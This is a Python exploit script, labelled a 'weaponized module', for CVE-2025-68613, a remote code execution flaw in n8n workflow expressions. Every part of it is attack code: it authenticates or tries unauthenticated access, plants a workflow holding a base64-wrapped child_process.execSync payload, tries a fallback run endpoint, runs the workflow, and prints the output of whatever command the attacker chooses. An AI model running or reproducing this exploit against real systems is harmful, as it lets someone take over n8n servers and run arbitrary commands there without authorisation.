#!/usr/bin/env python3
"""
CVE-2025-68613: n8n Workflow Expression Injection RCE
DissectX Weaponized Module
"""

import argparse
import sys
import requests
import time
import json
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class N8nExploit:
    def __init__(self, target, username=None, password=None, command="id"):
        self.target = target.rstrip('/')
        self.username = username
        self.password = password
        self.command = command
        self.session = requests.Session()
        self.session.verify = False

    def log(self, type, message):
        icons = {"INFO": "[*]", "SUCCESS": "[+]", "ERROR": "[-]"}
        print(f"{icons.get(type, '[?]')} {message}")

    def authenticate(self):
        if not self.username or not self.password:
            self.log("INFO", "No credentials provided. Attempting unauthenticated access...")
            return True

        self.log("INFO", f"Authenticating as {self.username}...")
        try:
            auth_url = f"{self.target}/rest/login"
            resp = self.session.post(auth_url, json={"email": self.username, "password": self.password}, timeout=10)
            if resp.status_code == 200:
                self.log("SUCCESS", "Authentication successful")
                return True
            else:
                self.log("ERROR", f"Authentication failed: HTTP {resp.status_code}")
                return False
        except Exception as e:
            self.log("ERROR", f"Connection error: {e}")
            return False

    def create_malicious_workflow(self):
        self.log("INFO", "Creating malicious workflow container...")
        
        # Node.js payload wrapper for n8n expression injection
        # This payload leverages the 'process' object accessible in the workflow context
        encoded_cmd = base64.b64encode(self.command.encode()).decode()
        payload = (
            f"{{{{ process.mainModule.require('child_process').execSync("
            f"Buffer.from('{encoded_cmd}', 'base64').toString()"
            f").toString() }}}}"
        )

        workflow_data = {
            "name": f"DissectX_PoC_{int(time.time())}",
            "nodes": [
                {
                    "parameters": {},
                    "name": "Start",
                    "type": "n8n-nodes-base.start",
                    "typeVersion": 1,
                    "position": [250, 300]
                },
                {
                    "parameters": {
                        "jsCode": f"// DissectX Exploit Payload\nreturn [\n  {{\n    json: {{\n      output: '{payload}'\n    }}\n  }}\n];"
                    },
                    "name": "ExploitNode",
                    "type": "n8n-nodes-base.function",
                    "typeVersion": 1,
                    "position": [450, 300]
                }
            ],
            "connections": {
                "Start": {
                    "main": [
                        [
                            {
                                "node": "ExploitNode",
                                "type": "main",
                                "index": 0
                            }
                        ]
                    ]
                }
            }
        }

        try:
            create_url = f"{self.target}/rest/workflows"
            resp = self.session.post(create_url, json=workflow_data)
            if resp.status_code == 200:
                wf_id = resp.json().get('data', {}).get('id')
                self.log("SUCCESS", f"Malicious workflow created (ID: {wf_id})")
                return wf_id
            
            # Try alternative unsaved execution if creation fails
            self.log("INFO", "Workflow creation failed (auth?). Attempting direct manual execution endpoint...")
            return workflow_data # Return data for manual trigger attempt
            
        except Exception as e:
            self.log("ERROR", f"Workflow creation error: {e}")
            return None

    def execute_workflow(self, workflow_id_or_data):
        self.log("INFO", "Triggering workflow execution...")
        
        try:
            if isinstance(workflow_id_or_data, dict):
                # Manual run mode (often allowed with lower permissions)
                run_url = f"{self.target}/rest/workflows/run"
                resp = self.session.post(run_url, json={"workflowData": workflow_id_or_data})
            else:
                # Saved workflow mode
                run_url = f"{self.target}/rest/workflows/{workflow_id_or_data}/run"
                resp = self.session.post(run_url, json={})

            if resp.status_code == 200:
                data = resp.json()
                # Parse output from the function node
                try:
                    output = data['data']['resultData']['runData']['ExploitNode'][0]['data']['main'][0][0]['json']['output']
                    self.log("SUCCESS", "RCE Successful! Output received:")
                    print("\n" + "="*50)
                    print(output.strip())
                    print("="*50 + "\n")
                    return True
                except (KeyError, IndexError):
                    self.log("ERROR", "Exploit executed but could not parse output structure.")
                    print(json.dumps(data, indent=2))
                    return False
            else:
                self.log("ERROR", f"Execution failed: HTTP {resp.status_code}")
                return False

        except Exception as e:
            self.log("ERROR", f"Execution error: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description='n8n CVE-2025-68613 RCE PoC (DissectX)')
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., http://n8n.local:5678)')
    parser.add_argument('-u', '--username', help='Username (email) for auth')
    parser.add_argument('-p', '--password', help='Password for auth')
    parser.add_argument('-c', '--command', default='id', help='Command to execute')
    
    args = parser.parse_args()

    exploit = N8nExploit(args.target, args.username, args.password, args.command)
    
    if exploit.authenticate():
        wf = exploit.create_malicious_workflow()
        if wf:
            exploit.execute_workflow(wf)
        else:
            print("[-] Could not create or stage workflow.")
    else:
        print("[-] Authentication failed. Target might require credentials.")

if __name__ == "__main__":
    main()
